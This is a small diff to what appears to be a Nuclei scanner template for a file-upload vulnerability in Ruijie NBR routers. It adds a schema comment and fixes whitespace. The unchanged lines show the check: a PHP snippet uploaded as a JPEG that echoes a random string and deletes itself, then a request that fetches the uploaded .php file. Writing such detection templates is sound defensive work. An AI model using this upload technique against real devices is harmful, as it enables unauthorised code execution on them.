@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: ruijie-nbr-router-fileupload-upload
 
 info:
@@ -17,7 +18,7 @@ http:
         Content-Type: image/jpeg
 
         <?php echo "{{randstr_1}}"; unlink(__FILE__); ?>
-      
+
       - |
         GET /ddi/server/upload/{{randstr_2}}.php HTTP/1.1
         Host: {{Hostname}}
